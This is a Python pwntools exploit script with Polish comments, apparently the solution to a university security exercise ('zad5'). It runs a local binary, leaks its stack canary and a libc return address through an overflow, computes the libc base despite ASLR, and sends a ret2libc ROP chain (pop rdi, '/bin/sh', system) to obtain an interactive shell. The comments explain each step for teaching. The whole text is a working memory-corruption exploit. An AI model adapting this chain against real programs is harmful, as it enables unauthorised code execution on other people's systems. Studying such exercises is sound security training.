from pwn import *

# Offsets
# np. "gdb /lib/x86_64-linux-gnu/libc.so.6" i polecenie "p/x &system"
SYSTEM_OFF = 0x45e50
# strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
BIN_SH_OFF = 0x196152
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rdi'
POP_RDI_OFF = 0x0000000000023796 # pop rdi ; ret

# Kod programu, wynikowy kod binarki, przez co także układ stosu, są dokładnie
# takie same jak w "zad4.c". Po opis znajdowania kanarka i adresów odsyłamy
# do rozwiązania tamgego zadania.
r = process("./zad5")

# Wyciekamy kanarka + adres stosu (acz nie jest w praktyce używany).
msg = b'a' * (0x28 + 1)
r.send(msg)

r.recvn(0x28)
canary = r.recvn(8)
canary = b'\x00' + canary[1:]

stack = r.recvn(6) + b'\x00\x00'
stack = u64(stack)
info("stack: " + hex(stack))

# Używając gdb możemy podejrzeć stos i znaleźć na nim jakiś adres ze
# standardowej biblioteki C (libc).
# Program jest linkowany dynamicznie, więc funkcja main() została wywołana
# przez "__libc_start_main()", które znajduje się w libc. Adres powrotu
# z main() będzie więc wskazywał jakieś miejce w tej funkcji.
# W naszym programie jest to drugie 64bitowe słowo na stosie za adresem powrotu
# z funkcji echo(), czyli przesunięcie (offset) 0x48 od początku bufora, który
# nadpisujemy. Wyciekamy ten adres analogicznie jak adres stosu i kanarka.
msg = b'a' * 0x48
r.send(msg)
r.recvn(0x48)
x = r.recvn(6) + b'\x00\x00'
# offset adresu powrotu z main() do __libc_start_main(), liczony od początku
# biblioteki libc.
# Uruchamiając testowo nasze roziwązanie możemy znależć adres bazowy libc
# (np. używając gdb) i odjąć go od wyciekniętego powyżej adresu, uzyskując
# poniższy offset.
# Biblioteka libc jest ładowana przy każdym uruchomieniu pod inny adres
# w pamięci (ASLR), ale offset jest od początku pliku do adresu powrotu
# z main() do __libc_start_main() i jest stały.
libc = u64(x) - 0x23d0a
info("libc: " + hex(libc))

msg = b'a' * 0x28  # bufor + padding
msg += canary
msg += p64(0)      # saved rbp
# Poniżej nadpisujemy adres powrotu pierwszym gadżetem ROP chain, potem reszta
# gadżetów
# Uwaga! W zależności od użytej biblioteki libc może być potrzebny jeszcze
# jeden gadżet, który nic nie robi, jedynie przesuwa stos o 8 bajtów, np:
# msg += p64(libc + POP_RDI_OFF + 1) # pop rdi ; ret
# Instrukcja "pop rdi" zajmuje jeden bajt, więc powyższe wskazuje po prostu
# na instrukcję "ret".
# Potrzeba ta wynika stąd, że x64 ABI ma wymaganie wyrównania stosu do 8
# modulo 16, po wejściu do funkcji (po "call", czyli w momencie kiedy mamy
# wykonać pierwszą instrukcję funkcji). W tym ROP chain, który napisaliśmy
# poniżej, stos nie jest wyrównany w momencie wywołania funkcji "system"
# mimo to wszystko działa na serwerze "students". Dzieje się tak, gdyż
# na tym serwerze ta funkcja nie wykorzystuje faktu, że stos jest wyrównany
# natomiast nowsze wersje biblioteki libc mogą to wykorzystać i wyemitować
# instrukcje SSE/AVX, które takiego wyrównania stosu wymagają.
msg += p64(libc + POP_RDI_OFF) # pop rdi ; ret
msg += p64(libc + BIN_SH_OFF)  # adres /bin/sh
msg += p64(libc + SYSTEM_OFF)  # system

r.send(msg)
r.recv()

r.send(b'exit')

r.interactive()
